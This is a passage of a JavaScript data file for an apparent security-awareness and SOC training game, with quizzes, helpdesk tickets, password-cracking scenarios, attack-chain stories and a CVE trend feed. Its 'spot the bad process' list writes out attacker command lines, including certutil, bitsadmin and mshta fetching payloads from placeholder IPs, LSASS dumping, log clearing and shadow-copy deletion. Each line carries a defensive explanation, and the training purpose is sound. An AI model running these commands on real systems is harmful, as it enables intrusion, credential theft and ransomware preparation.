 {id:"stix",gen:"ti",need:5,c:300000,e:"link",n:"STIX/TAXII integration",d:"Threat intel x2"},{id:"guard",gen:"ai",need:5,c:3e6,e:"detect",n:"Guardrails for AI agents",d:"AI agents x2 (and no more hallucinated IOCs)"},
 {id:"sla",gen:"mssp",need:5,c:3e7,e:"edit",n:"Better SLAs",d:"MSSP x2"}];
export const MI = [
 {q:"Which domain is the typosquat?",o:["microsoft.com","rnicrosoft.com","office.com"],a:1,w:"'rn' looks like 'm' at a glance. Classic lookalike trick."},
 {q:"Port 3389 is usually…",o:["RDP","SMB","LDAP"],a:0,w:"3389 = Remote Desktop. Never expose it straight to the internet."},
 {q:"Windows event 4625 means…",o:["Failed logon","Successful logon","Account created"],a:0,w:"4625 = failed logon. Bursts suggest brute force or spraying."},
 {q:"Which built-in tool is often abused to download files?",o:["certutil.exe","calc.exe","notepad.exe"],a:0,w:"certutil -urlcache -f is a favourite LOLBin download trick."},
 {q:"Your company is acme.com. Which sender is most likely phishing?",o:["it@acme.com","it@acme-support.co","noreply@acme.com"],a:1,w:"Lookalike domains with extra words ('-support') are a common phishing tell."},
 {q:"SPF, DKIM and DMARC mainly protect against…",o:["Email spoofing","SQL injection","Ransomware"],a:0,w:"They let receivers verify a sender is allowed to send for that domain."},
 {q:"EPSS estimates…",o:["Chance of exploitation in 30 days","How severe a bug is","Whether a patch exists"],a:0,w:"CVSS = how bad. EPSS = how likely. KEV = it's already happening."},
 {q:"Port 445 is…",o:["SMB","HTTPS","DNS"],a:0,w:"SMB on 445: EternalBlue's favourite door. Block it at the perimeter."},
 {q:"Logon type 10 means…",o:["RDP (RemoteInteractive)","Network","Service"],a:0,w:"Type 10 = RemoteInteractive, i.e. RDP."},
 {q:"A beacon every exactly 60s to a 2-day-old domain suggests…",o:["Command and control","Backups","Time sync"],a:0,w:"Perfect intervals to a brand-new domain = C2 heartbeat."},
 {q:"Which hash should NOT be trusted for integrity anymore?",o:["MD5","SHA-256","SHA-512"],a:0,w:"MD5 collisions are practical. Use SHA-256 or better."},
 {q:"'vssadmin delete shadows /all /quiet' is typical of…",o:["Ransomware","Patching","Disk cleanup"],a:0,w:"Deleting shadow copies stops easy recovery, so ransomware does it first."},
 {q:"Kerberoasting targets…",o:["Service accounts with SPNs","Printers","DNS servers"],a:0,w:"Tickets for SPN accounts can be cracked offline. Use long random passwords or gMSAs."},
 {q:"Which login URL is suspicious?",o:["login.microsoftonline.com","login.microsoftonline.com.verify-session.io","portal.azure.com"],a:1,w:"The real domain is what's right before the last dot: verify-session.io."},
 {q:"MITRE ATT&CK T1566 is…",o:["Phishing","Brute Force","Exfiltration"],a:0,w:"T1566 = Phishing, still the most common way in."},
 {q:"Base64 'cG93ZXJzaGVsbA==' decodes to…",o:["powershell","password","payload"],a:0,w:"Spotting base64 'powershell' in logs is a handy tell."}];
export const DECODE_PHRASES = ["assume breach","least privilege","defense in depth","zero trust","its always dns","living off the land","patch tuesday","trust but verify","blue team forever","read only friday","segment your network","rotate your keys"];
export const DECODE_KINDS = [
  {k:"base64",enc:s=>btoa(s),hint:"Letters, digits, + and /, often ending in = padding. Length is a multiple of 4. That's Base64.",how:"Paste it into CyberChef with 'From Base64', or run: echo '...' | base64 -d"},
  {k:"hex",enc:s=>Array.from(s,ch=>ch.charCodeAt(0).toString(16).padStart(2,"0")).join(" "),hint:"Pairs of 0-9 and a-f. 20 is a space. That's hex.",how:"Each pair is one byte. CyberChef 'From Hex', or: echo '...' | xxd -r -p"},
  {k:"rot13",enc:s=>s.replace(/[a-z]/g,ch=>String.fromCharCode((ch.charCodeAt(0)-84)%26+97)),hint:"Real word shapes, wrong letters. Every letter is shifted 13 places: ROT13.",how:"Apply ROT13 again to decode it. Malware still uses it to hide strings."},
  {k:"url",enc:s=>Array.from(s,ch=>"%"+ch.charCodeAt(0).toString(16).toUpperCase().padStart(2,"0")).join(""),hint:"Lots of % followed by two hex characters. That's URL (percent) encoding.",how:"CyberChef 'URL Decode'. Attackers fully encode URLs to slip past filters."},
  {k:"reversed",enc:s=>s.split("").reverse().join(""),hint:"Read it backwards.",how:"PowerShell droppers love reversed strings: -join('...')[-1..-100]"}];
export const STICKERS = [
 {id:"dns",n:"It's always DNS",r:"c",c:"#5CE1C6",i:"cloud"},{id:"ptue",n:"Patch Tuesday veteran",r:"c",c:"#F5B841",i:"patch"},{id:"printer",n:"Printer whisperer",r:"c",c:"#8D93A8",i:"printer"},
 {id:"rof",n:"Read-only Friday",r:"c",c:"#7FB7EE",i:"lock"},{id:"3am",n:"3 AM club",r:"c",c:"#A9A1E8",i:"moon"},{id:"coffee",n:"Fuelled by coffee",r:"c",c:"#C9A77F",i:"brew"},
 {id:"isolate",n:"Have you tried isolating it?",r:"c",c:"#F2946B",i:"x"},{id:"sigma",n:"Sigma fan club",r:"c",c:"#5CE1C6",i:"scroll"},
 {id:"zt",n:"Zero trust, full coffee",r:"r",c:"#E8505B",i:"detect"},{id:"purple",n:"Purple teamer",r:"r",c:"#B07BD8",i:"users"},{id:"roast",n:"Kerberoast chef",r:"r",c:"#F2946B",i:"flame"},
 {id:"lp",n:"Least privilege lifestyle",r:"r",c:"#7FB7EE",i:"lock"},{id:"mfa",n:"Immune to MFA fatigue",r:"r",c:"#5CE1C6",i:"bolt"},
 {id:"log4",n:"Log4Shell survivor",r:"l",c:"#F5B841",i:"fame"},{id:"gold",n:"Golden 0-day",r:"l",c:"#FFD36B",i:"sparkle"},{id:"blue",n:"Blue team forever",r:"l",c:"#4F7BFF",i:"heart"}];
export const RARITY = {c:["common",70],r:["rare",25],l:["legendary",5]};
export const TD_WORDS = [["certutil","Built-in tool abused to download files"],["mimikatz","Credential dumping tool"],["psexec","Remote execution, common in lateral movement"],["vssadmin","Deleting shadow copies is ransomware prep"],
 ["rundll32","Runs DLLs, abused to launch payloads"],["mshta","Runs HTA files, abused for script execution"],["lsass","The process attackers dump for credentials"],["beacon","Malware checking in with its C2 server"],
 ["kerberoast","Cracking service tickets offline"],["bloodhound","Maps attack paths through Active Directory"],["wevtutil","Can clear Windows event logs"],["bitsadmin","BITS jobs abused for downloads"],
 ["schtasks","Scheduled tasks for persistence"],["regsvr32","Abused to run remote scriptlets"],["netcat","Raw network connections, reverse shells"],["xmrig","Cryptominer dropped by attackers"],
 ["phish","Still the number one way in"],["exfil","Data leaving the building"],["ransom","Encrypt, extort, repeat"],["sqlmap","Automated SQL injection tool"],["nmap","Network scanner: whose scan is this?"],["cobalt","Cobalt Strike, a favourite C2 framework"]];
export const CAST = {
  kevin:{n:"Kevin",t:"Finance",a:{bg:"#2A3350",skin:"#F1C9A5",hair:"#6B4423",style:"short",acc:"glasses",shirt:"#7FB7EE"},q:"Clicks everything. Means well."},
  dave:{n:"Dave",t:"IT service desk",a:{bg:"#1F3A40",skin:"#D8A27C",hair:"#2A1A12",style:"short",acc:"headset",shirt:"#5CE1C6"},q:"Will try to give you printers."},
  priya:{n:"Priya",t:"Network team",a:{bg:"#3A2350",skin:"#B67B55",hair:"#1B1210",style:"long",acc:"none",shirt:"#A9A1E8"},q:"It's not the firewall. It's never the firewall."},
  ciso:{n:"The CISO",t:"Corner office",a:{bg:"#3A1F24",skin:"#EBC3A0",hair:"#8D93A8",style:"bald",acc:"tie",shirt:"#2A2E3A"},q:"Has a board meeting in one hour. Always."},
  helen:{n:"Helen",t:"HR",a:{bg:"#3A3020",skin:"#F4D2B5",hair:"#C98F1E",style:"bun",acc:"none",shirt:"#F2946B"},q:"Trusts anyone who sounds polite on the phone."},
  dan:{n:"Dan",t:"Developer",a:{bg:"#202A3A",skin:"#E3B48F",hair:"#3B2A20",style:"short",acc:"hoodie",shirt:"#3A4566"},q:"It works on his machine."},
  marco:{n:"Marco",t:"Facilities",a:{bg:"#2A3A20",skin:"#C68C64",hair:"#E8505B",style:"cap",acc:"none",shirt:"#8FD5A6"},q:"Knows where every cable goes. Not which ones matter."},
  sam:{n:"Sam",t:"The intern",a:{bg:"#3A2A40",skin:"#F0CDB0",hair:"#5A3A2A",style:"long",acc:"glasses",shirt:"#F5B841"},q:"Enthusiastic. Has admin ideas."},
  vendor:{n:"Brad",t:"A vendor",a:{bg:"#2A2A2A",skin:"#F1C9A5",hair:"#D9B26A",style:"short",acc:"tie",shirt:"#1C1F27"},q:"Just wants 15 minutes of your time."}};
export const ROUTES = [["soc","Ours"],["it","Bounce to IT"],["net","Bounce to Network"],["ir","Escalate to IR"],["close","Close it, with a lesson"]];
export const TICKETS = [
 {f:"kevin",ch:"walk",m:"My mouse is moving really slowly today. Is it a hacker?",a:"it",w:"A slow mouse is hardware or drivers. Call us if it starts moving by itself."},
 {f:"kevin",ch:"email",m:"Got an invoice from a supplier we don't use. Opened it to check. It asked me to enable macros, so I did. Nothing happened?",a:"soc",w:"Enabled macros on an unknown invoice is a likely infection. Isolate the laptop and investigate."},
 {f:"helen",ch:"phone",m:"I'm locked out of my account. Can you reset my password?",a:"it",w:"Password resets are the service desk's job. The SOC only cares if the lockout looks like an attack."},
 {f:"priya",ch:"chat",m:"Lots of outbound traffic from the file server to an IP I don't know, every 60 seconds, since 3 AM. Before you ask: the firewall is fine.",a:"soc",w:"A perfectly timed beacon from a server is a classic C2 sign. That's ours."},
 {f:"dan",ch:"chat",m:"Can you whitelist my laptop in the EDR? It keeps killing my mimikatz. I'm only testing.",a:"soc",w:"A security exception request for a credential dumper. Ours, and the answer is almost certainly no."},
 {f:"ciso",ch:"email",m:"Board meeting in 1 hour. Need one slide: are we safe from the thing on the news?",a:"soc",w:"Exposure questions about a threat are exactly what the SOC answers. Keep it to one slide."},
 {f:"kevin",ch:"phone",m:"The Wi-Fi in meeting room B is slow again.",a:"net",w:"Slow Wi-Fi is a network problem, not a security one."},
 {f:"sam",ch:"chat",m:"I accidentally ran nmap against the whole office subnet. Is that bad?",a:"close",w:"Not an incident, but a teachable moment: no scanning without approval, and tell the SOC first next time."},
 {f:"helen",ch:"phone",m:"Someone from 'IT support' called and asked for my MFA code. I gave it to him, he sounded so nice.",a:"soc",w:"That's account compromise via vishing. Revoke sessions, reset credentials, check for MFA device changes. Now."},
 {f:"dave",ch:"chat",m:"Printer on floor 2 says PC LOAD LETTER. You guys handle printers, right?",a:"it",w:"Dave is trying to give you printers again. Bounce it straight back."},
 {f:"dan",ch:"email",m:"Pushed our AWS keys to a public GitHub repo by accident. I deleted the commit, so we're fine?",a:"soc",w:"Bots scrape public repos within minutes, and the commit history remembers. Rotate the keys and check the account for abuse."},
 {f:"kevin",ch:"walk",m:"Found a USB stick in the car park labelled 'Salaries 2026'. I plugged it in to find the owner.",a:"soc",w:"The oldest trick in the book. Isolate the machine, grab the USB, investigate."},
 {f:"vendor",ch:"email",m:"Quick 15-minute call to show how our AI platform eliminates 100% of your alerts?",a:"close",w:"If something eliminates 100% of alerts, it's called unplugging the SIEM. Close it."},
 {f:"helen",ch:"walk",m:"Can I install this free PDF converter I found? It's free!",a:"it",w:"Software requests go to IT, who check it against the approved list. Free software is often paid for in malware."},
 {f:"dave",ch:"phone",m:"Three servers just showed ransom notes. Files are being renamed to .locked. It's spreading.",a:"ir",w:"Active ransomware is a full incident. Escalate to IR and start containment immediately."},
 {f:"ciso",ch:"walk",m:"Why did the SIEM bill go up 40% this month?",a:"soc",w:"Ingestion is the SOC's job, so is the bill. Probably someone turned on debug logging on the firewall. Hi Priya."},
 {f:"kevin",ch:"walk",m:"My password expired. Can I just use Password2026! ? It has a symbol and everything.",a:"close",w:"Season or word plus year plus a symbol is the first thing attackers try. Teach him passphrases."},
 {f:"priya",ch:"chat",m:"VPN is down for the Singapore office.",a:"net",w:"VPN outages are Network's. Unless it went down because someone is attacking it, in which case call us back."},
 {f:"marco",ch:"phone",m:"Server room is very warm and something is beeping.",a:"it",w:"Hot server rooms are an IT and facilities emergency, not a security one. Tell them quickly though."},
 {f:"helen",ch:"email",m:"The CEO emailed asking me to buy 20 gift cards urgently and keep it quiet. Should I use my card or the company one?",a:"soc",w:"Classic CEO-fraud email. Block the sender, warn the company, thank Helen for asking first."},
 {f:"kevin",ch:"email",m:"I reported a phishing email, then clicked the link to see if it was really phishing. It was!",a:"soc",w:"Reporting was great. Clicking was not. Check what he entered and what the link did."},
 {f:"ciso",ch:"phone",m:"A journalist says our customer database is for sale on a forum. Comment by 5 PM?",a:"ir",w:"A possible data breach with media attention is a full incident: IR, legal and comms, now."},
 {f:"dave",ch:"chat",m:"User says their PC is slow. Can you run a virus scan for them? We're swamped.",a:"it",w:"A slow PC with no other signs is IT's. The EDR is already scanning anyway."},
 {f:"priya",ch:"walk",m:"The new firewall rules are blocking the SIEM collector. Not my fault, the rules were approved.",a:"net",w:"It is, in fact, the firewall this time. Network fixes the rule. Enjoy the moment."},
 {f:"sam",ch:"walk",m:"Can I get domain admin? It would make my job so much easier.",a:"close",w:"Least privilege: nobody gets domain admin for convenience. Especially the intern."},
 {f:"kevin",ch:"phone",m:"I wrote my password on a sticky note, but I put it under the keyboard, so it's hidden.",a:"close",w:"Under the keyboard is the second place everyone looks. Introduce Kevin to a password manager."},
 {f:"dan",ch:"chat",m:"Prod is down! Is it a DDoS? Also, I deployed five minutes ago, if that matters.",a:"close",w:"Traffic is normal and he just deployed. Not a DDoS. Send him back to his rollback button."},
 {f:"marco",ch:"walk",m:"There's someone in a hi-vis vest in the server room. Says he's fixing the air con. Didn't sign in.",a:"soc",w:"Unescorted, unsigned visitor in a secure room is a physical security incident. Ours, and quickly."}];
export const WRONG = {soc:"You took it on. An hour later it turns out this was never ours.",it:"Dave bounces it right back: 'Nice try. This is clearly security.'",net:"Priya bounces it back: 'It's not the firewall. It's never the firewall.'",
  ir:"The IR team: 'You woke us up for this?'",close:"You closed it. It got worse. Now the CISO knows."};
export const CISO_LINES = ["Why is this on my desk?","Who closed that ticket?","I'm getting calls from the board.","I said ONE slide.","Is this the thing from the news? Tell me it isn't the thing from the news.","We have a tool for this. Several, in fact. Very expensive ones."];
export const CISO_STATES = [[80,"Calm, sipping tea"],[60,"Mildly concerned"],[40,"Typing in all caps"],[20,"Walking over to your desk"],[0,"Board meeting energy"]];
export const CH_LABEL = {walk:"walk-in",phone:"phone call",chat:"chat",email:"email"};
export const CH_SOUND = {walk:"knock",phone:"ring",chat:"ping",email:"ping"};
export const TOOLS = [
 {id:"mde",n:"Defender for Endpoint",s:["Operational","Portal loading. Still.","Device timeline taking a scenic route","Agent check-in delayed"],x:["Have you tried waiting for the portal to finish loading?","That device is onboarded. Spiritually.","Advanced hunting says 0 results. Have you tried a different table?","Your alert was merged into an incident about something else entirely."]},
 {id:"secops",n:"Google SecOps",s:["Operational","Ingestion lag 42 minutes","Parser having a moment","UDM field went on holiday"],x:["Your query is valid. In a different UDM field.","That log arrived. It's parsed as GENERIC_EVENT now.","Detection ran successfully on zero events.","Have you read the YARA-L docs? All of them?"]},
 {id:"pan",n:"Palo Alto firewall",s:["Operational","Commit in progress since lunch","Rule 4,017 of 4,018 matched","Threat logs very quiet. Suspiciously."],x:["It's not the firewall. Priya told me to say that.","Your change is committed. Pending the other commit. Pending the other other commit.","The traffic was allowed by a rule called 'temp-any-any-2019'.","Have you checked the URL category? It's 'Unknown'. Like your weekend plans."]},
 {id:"splunk",n:"Splunk",s:["Operational","Search queued behind 14 others","Licence warning (it's fine)","Indexer catching its breath"],x:["Your search has been queued behind 14 others. Most of them are yours.","Results truncated at 10,000. The interesting one was 10,001.","Have you tried adding 'index=*'? Please don't.","Field extracted successfully as 'field1'."]},
 {id:"snow",n:"ServiceNow",s:["Operational","Form has 47 mandatory fields","Assignment group: ???","Slow, but in an official way"],x:["Your yell has been logged as INC0042069 and assigned to the wrong group.","Please select a category. 'Rage' is not a valid category.","This ticket has been auto-closed due to inactivity. Yours.","Thank you for your feedback. A survey is on its way."]},
 {id:"okta",n:"Okta",s:["Operational","Push notification lag","Session timeouts feeling generous","SSO tile playing hide and seek"],x:["Please approve this push to continue yelling.","Your session expired while you were typing that.","That user has 14 MFA factors and remembers none of them.","Sign-in risk: high. Reason: you sound angry."]}];
export const PEBKAC = [
 ["The sticky note","Password on a sticky note on the monitor, 'for emergencies'.","Password managers exist so nobody has to choose between remembering and writing it down."],
 ["invoice.pdf.exe","Double-clicked 'invoice.pdf.exe' because the icon looked like a PDF.","Turn on file extensions. Icons lie, extensions mostly don't."],
 ["The helpful reply","Replied to a phishing email with their username and password, 'to confirm it was fake'.","Report it, never reply to it. Phishers love confirmation."],
 ["Screen share surprise","Shared their screen on a 200-person call with the password manager open.","Share a window, not the whole desktop."],
 ["The car-park USB","Plugged in a USB stick found in the car park to find the owner.","Found USB sticks go to the SOC, not into a laptop."],
 ["Password, but secure","'My password is Password1, but with a capital P, for security.'","Length beats complexity. Four random words beat P@ssw0rd."],
 ["MFA, approved","Approved 14 MFA pushes at 2 AM 'to make the phone stop buzzing'.","If you didn't just log in, deny the push and tell the SOC."],
 ["The shared account","The whole team logs into one account called 'finance_shared'.","Shared accounts mean nobody is accountable, especially during an incident."],
 ["Just this once","Disabled the antivirus 'just for this one installer' from a forum.","If the installer needs antivirus off, the installer is the problem."],
 ["The public Wi-Fi","Logged into the payroll system from airport Wi-Fi called 'Free_Airport_WiFi_Real'.","Use the VPN. And maybe don't trust networks with 'Real' in the name."]];
export const COMMON_PW = ["password","123456","12345678","123456789","qwerty","abc123","111111","letmein","welcome","admin","iloveyou","monkey","dragon","football","baseball","sunshine","princess","master","shadow","superman","michael","trustno1","passw0rd","p@ssw0rd","p@ssword","password1","qwerty123","1q2w3e4r","zaq12wsx","starwars","hello","freedom","whatever","login","changeme","secret","summer","winter","spring","autumn","company","contoso","liverpool","chelsea","arsenal","pokemon","batman","cheese","computer","internet","myspace","solarwinds123"];
export const WALKS = ["qwerty","asdf","zxcv","1qaz","2wsx","qazwsx","12345","23456","34567","09876","abcdef","poiuy","lkjhg"];
export const PW_VERDICTS = [[0,"Kevin-grade","Instantly guessed. Please never use this."],[28,"Sticky-note tier","A laptop cracks this before your coffee cools."],[45,"Meh","Fine against a login page, weak against a stolen hash."],[60,"Solid","Strong enough for most things, especially with MFA."],[80,"Fortress","Attackers will phish you instead. Stay alert."]];
export const PP_WORDS = ["anchor","biscuit","cactus","dolphin","ember","falcon","glacier","harbor","igloo","jigsaw","kettle","lantern","marble","nugget","orbit","pepper","quartz","rocket","saddle","teapot","umbrella","velvet","walnut","yodel","zipper","acorn","banjo","comet","donut","fossil","gravy","hammock","island","jelly","koala","lemon","mango","noodle","otter","pickle","radar","sprout","tunnel","violin","waffle","yonder","zebra","basil","canyon","domino"];
export const CRACK = [
 {who:"kevin",pw:"mittens2019!",c:["His cat is called Mittens and he posts about her every day","He adopted Mittens in 2019","The policy says 'end with a symbol', so he added the most common one"],l:"Pet name plus year plus symbol. Social media gave it all away."},
 {who:"helen",pw:"Summer2026!",c:["Her email signature says 'counting down to summer'","She changed her password this year","Policy: start with a capital, end with a symbol"],l:"Season plus year is the most sprayed password pattern on the internet."},
 {who:"dan",pw:"qwerty12345",c:["He uses a keyboard pattern because it's 'easy to type'","It's the top-left row of letters, then counting up from 1","He reuses it everywhere"],l:"Keyboard walks are in every cracking wordlist. Reuse made it worse."},
 {who:"marco",pw:"liverpool1",c:["He never misses a Liverpool match","All lowercase, no spaces","The policy needed a number, and he picked the smallest one"],l:"Favourite team plus 1. Attackers love sports fans."},
 {who:"sam",pw:"Password1",c:["Started this month and was in a hurry","Rules: 8+ characters, a capital and a number","He picked the most obvious word there is for a password"],l:"Policies that only check character types produce Password1. Length rules and blocklists fix it."},
 {who:"ciso",pw:"b1scu1t1975",c:["His dog is called Biscuit","He was born in 1975","He swapped every letter i for the number 1 and thinks that's 'military grade'"],l:"Leetspeak swaps are applied automatically by cracking rules. They add almost nothing."},
 {who:"dave",pw:"Contoso2026!",c:["He sets every new starter's password himself","The company is called Contoso","Format: company name with a capital, this year, exclamation mark"],l:"Predictable default passwords mean every new account starts compromised. Force a change at first login."},
 {who:"priya",pw:"admin",c:["It's the old switch in the comms cupboard","Nobody has changed it since it was installed","The username is admin, and so is the password"],l:"Default credentials on network gear are an attacker's favourite door. Change them on day one."},
 {who:"helen",pw:"Charlie2018",c:["Her son Charlie's photo is her profile picture","Charlie was born in 2018 (she posted the birthday cake)","First letter capital, no symbol"],l:"Children's names and birth years are in every targeted wordlist. Public posts make it easy."},
 {who:"kevin",pw:"Welcome123",c:["It's the password IT gave him on day one","He never changed it","It's a friendly greeting with a capital, then 1, 2, 3"],l:"Welcome123 and friends are the first guesses in any spray. Force a change and block common choices."},
 {who:"marco",pw:"Barcelona2024",c:["His honeymoon was in Barcelona","He went in 2024","Capital first letter, city, year"],l:"Holidays posted online become passwords. A random passphrase can't be found on Instagram."},
 {who:"dan",pw:"letmein!",c:["He was annoyed when he set it","It's three words squashed together asking to be let in","All lowercase, then the most common symbol"],l:"Frustration passwords are common enough to be in every list. Use a password manager instead."},
 {who:"sam",pw:"iloveyou",c:["He set it on his first day, feeling positive","Three words run together, all lowercase","It's one of the most common passwords ever leaked"],l:"Leaked-password lists are where cracking starts. Check new passwords against them."},
 {who:"ciso",pw:"Board2026!",c:["He changes it before every board meeting","It's the word for who he presents to, with a capital","Then this year and an exclamation mark"],l:"Rotation without randomness just makes a predictable sequence. Modern advice: change only when compromised."},
 {who:"priya",pw:"Spring2026",c:["She rotates her password every season","It's spring right now in her world","Capital first letter, then this year, no symbol"],l:"Forced rotation creates season-year patterns. NIST now advises against routine expiry."},
 {who:"dave",pw:"Monday1!",c:["He hates the start of the week","It's the day of the week with a capital","Then 1 and an exclamation mark, the bare minimum the policy allows"],l:"Days and months with 1! on the end are in every password-spray list."},
];
export const PD_BAD = ["SYN flood","SQLi ' OR 1=1--","C2 beacon","Mimikatz","EternalBlue","<script>alert(1)","Brute force x500","${jndi:ldap://…}","Port scan","DNS tunnel","Ransom note","Cobalt Strike","Pass-the-hash","Exfil 4GB → pastebin"];
export const PD_GOOD = ["HTTPS 443","DNS query","NTP sync","Windows Update","SSO login","Backup job","CEO's Teams call","SMTP mail","Health check","Printer job ","VPN keepalive","Payroll export"];
export const TR_POOL = [
 {a:"4625 x 3,200 in 5 min · account svc_backup · source BACKUP-01 · password expired yesterday",k:0,w:"Expired service-account password on a known backup server. Fix the password, close."},
 {a:"WINWORD.EXE → powershell.exe -nop -w hidden -enc … · outbound to an unknown IP right after",k:2,w:"Malicious document executing and calling out. Isolate now."},
 {a:"Impossible travel: Singapore → Frankfurt in 9 min · both logins from the corporate VPN client",k:0,w:"VPN egress changed country; the user didn't. Classic geo false positive."},
 {a:"vssadmin delete shadows /all /quiet on FILESRV-02 · files being renamed to .locked",k:2,w:"Ransomware in progress. Contain immediately; minutes matter."},
 {a:"New local admin account 'support_tmp' created on a workstation at 02:14 by a helpdesk account",k:1,w:"Suspicious but needs context (change ticket? who was on shift?). Escalate."},
 {a:"DNS spike to *.windowsupdate.com from 400 hosts on Patch Tuesday evening",k:0,w:"It's Patch Tuesday. Everyone is downloading updates."},
 {a:"rundll32 loading C:\\ProgramData\\a.dll, beaconing every 60s exactly to a 2-day-old domain",k:2,w:"Perfectly timed beacon from a DLL in ProgramData to a brand-new domain = active C2."},
 {a:"User reported phish · link not clicked (proxy shows no visit) · sender spoofed CEO",k:1,w:"No compromise yet, but a CEO-spoof campaign needs a wider look: escalate to purge and block."},
 {a:"EDR: procdump.exe -ma lsass.exe on a domain controller",k:2,w:"Credential dumping on a DC is as bad as it gets. Contain and start IR."},
 {a:"4740 lockout for m.lee · source: her phone (ActiveSync) · she changed her password at 09:00",k:0,w:"Old password still saved on her phone. The most common lockout ever."},
 {a:"Audit log cleared (1102) on HR-FS01 by an account that never logs in interactively",k:1,w:"Strong red flag, but scope it first: escalate for investigation right away."},
 {a:"Vulnerability scanner 10.0.5.20 port-scanning the server VLAN during its scheduled window",k:0,w:"Your own scanner, on schedule. Close (and maybe tag it so it stops alerting)."},
 {a:"Okta: MFA push approved after 14 denied pushes in 3 minutes, new device from abroad",k:2,w:"MFA fatigue success. Revoke sessions and lock the account now."},
 {a:"certutil.exe -urlcache -f http://… downloading an .exe to C:\\Users\\Public",k:2,w:"certutil used as a downloader into a public folder: hands-on-keyboard attacker. Contain."},
 {a:"Large upload (2 GB) to a personal cloud drive from a finance laptop, user resigned last week",k:1,w:"Possible insider data theft. Needs HR/legal context: escalate, don't contain blindly."},
 {a:"PowerShell script block: Get-ADUser -Filter * run by an IT admin from the admin jump host",k:0,w:"Normal admin activity from the right place by the right person."}];
export const KC_SCEN = [
 {n:"Ransomware via phishing",s:[["Initial Access","User opens an ISO attachment from a phishing email"],["Execution","A hidden PowerShell command runs from the shortcut inside"],["Persistence","A scheduled task named 'OneDriveSync' is created"],["Credential Access","LSASS memory is dumped"],["Lateral Movement","Attacker RDPs to the file server with stolen credentials"],["Impact","Files are encrypted and shadow copies deleted"]]},
 {n:"Edge device to data theft",s:[["Initial Access","Unpatched VPN appliance is exploited"],["Discovery","Active Directory is queried for Domain Admins"],["Credential Access","Service accounts are Kerberoasted"],["Lateral Movement","PsExec is used to reach the database server"],["Collection","The database is dumped and zipped"],["Exfiltration","The archive is uploaded to cloud storage"]]},
 {n:"Poisoned software update",s:[["Initial Access","A trojanised vendor update is installed"],["Execution","The update's DLL runs at startup"],["Command and Control","It beacons to the attacker's domain every 60s"],["Discovery","The attacker enumerates mail servers"],["Collection","Executives' mailboxes are collected"],["Exfiltration","Mail is exported over HTTPS"]]},
 {n:"Stolen login, cloud wipe",s:[["Credential Access","An infostealer grabs saved browser passwords"],["Initial Access","The attacker logs in to the VPN with them"],["Persistence","A new MFA device is registered on the account"],["Privilege Escalation","The account is added to a privileged group"],["Defense Evasion","Audit logs are cleared"],["Impact","Backups are deleted"]]}];
export const LH_GOOD = [String.raw`C:\Windows\System32\svchost.exe -k netsvcs -p`,String.raw`"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer`,String.raw`C:\Windows\explorer.exe`,
 String.raw`"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"`,String.raw`C:\Windows\System32\taskhostw.exe`,String.raw`"C:\Program Files\Windows Defender\MsMpEng.exe"`,
 String.raw`C:\Windows\System32\wbem\WmiPrvSE.exe -secured -Embedding`,String.raw`C:\Windows\System32\gpupdate.exe /target:computer`,String.raw`C:\Windows\System32\spoolsv.exe`,
 String.raw`"C:\Program Files\7-Zip\7z.exe" a C:\Users\m.lee\Documents\report.zip report.docx`,String.raw`C:\Windows\System32\SearchIndexer.exe /Embedding`,
 String.raw`"C:\Program Files\BackupAgent\agent.exe" --scheduled-full`,String.raw`C:\Windows\System32\notepad.exe C:\Users\j.tan\Desktop\todo.txt`];
export const LH_BAD = [
 [String.raw`powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=`,"Hidden window + encoded command: PowerShell trying not to be read."],
 [String.raw`certutil.exe -urlcache -split -f http://203.0.113.7/a.txt C:\Users\Public\a.exe`,"certutil abused as a downloader (a classic LOLBin)."],
 [String.raw`rundll32.exe C:\Users\Public\update.dll,Start`,"Running a DLL from a user-writable public folder."],
 [String.raw`vssadmin.exe delete shadows /all /quiet`,"Deleting shadow copies: ransomware preparing to encrypt."],
 [String.raw`procdump.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`,"Dumping LSASS memory to steal credentials."],
 [String.raw`mshta.exe http://198.51.100.23/invoice.hta`,"mshta running a remote HTA file: script execution from the internet."],
 [String.raw`schtasks.exe /create /tn "Updater" /tr C:\ProgramData\u.exe /sc minute /mo 5`,"Persistence: a task running a ProgramData binary every 5 minutes."],
 [String.raw`wevtutil.exe cl Security`,"Clearing the Security event log to hide tracks."],
 [String.raw`bitsadmin.exe /transfer j http://203.0.113.9/p.exe C:\Users\Public\p.exe`,"BITS abused to download a payload."],
 [String.raw`net.exe localgroup administrators svc_helper /add`,"Adding an account to local Administrators."],
 [String.raw`bcdedit.exe /set {default} recoveryenabled no`,"Disabling Windows recovery: another ransomware prep step."]];
export const BODY = {cat:"#8C95B2",owl:"#8B6A4E",fox:"#E07A3A",panda:"#F1ECE2"};
export const FP_DATA = {
  generated: "2026-11-21T08:00:00Z",
  kevAddedLast7d: 6,
  lastEdgeCritical: "2026-11-19",
  edgeRecordDays: 11,
  trending: [
    {id:"CVE-2026-31431", nick:"Copy Fail", st:"POC PUBLIC", kev:null, sev:"high", product:"Linux kernel", type:"Local privilege escalation",
     why:"Reported as the most researched CVE of 2026 so far: lots of public exploit code means attackers already on a box can get root.",
     roast:"Every GitHub account now has a PoC folder and a dream.",
     action:"Patch the kernel and actually reboot. Prioritise multi-user and container hosts.",
     hug:"Kernel patch weekends build character. Allegedly."},
    {id:"CVE-2026-39987", nick:"marimo pre-auth RCE", st:"EXPLOITED", kev:null, sev:"critical", product:"marimo notebooks", type:"Pre-auth RCE via terminal WebSocket",
     why:"Broad exploitation and botnet weaponization were reported. Exposed notebooks = remote shell for anyone.",
     roast:"Data scientists exposed a notebook to the internet. Botnets did some data science of their own.",
     action:"Upgrade marimo, and never expose notebook servers publicly. Check for odd child processes.",
     hug:"Shadow IT isn't your fault. Finding it is your superpower."},
    {id:"CVE-2026-76461", nick:"Root-by-email", st:"EXPLOITED", kev:null, sev:"critical", product:"Cisco Secure Email Gateway", type:"SQL injection → root command execution",
     why:"Reported as actively exploited: a crafted email can lead to root command execution on the gateway itself.",
     roast:"The email gateway's job is to stop malicious email. It took that personally.",
     action:"Apply the vendor fix, review the gateway for compromise, and watch its outbound traffic.",
     hug:"Defending the thing that defends you is peak blue team."},
    {id:"CVE-2025-53770", nick:"ToolShell", st:"KEV LISTED", kev:true, sev:"critical", product:"SharePoint Server (on-prem)", type:"Unauthenticated RCE (deserialization)",
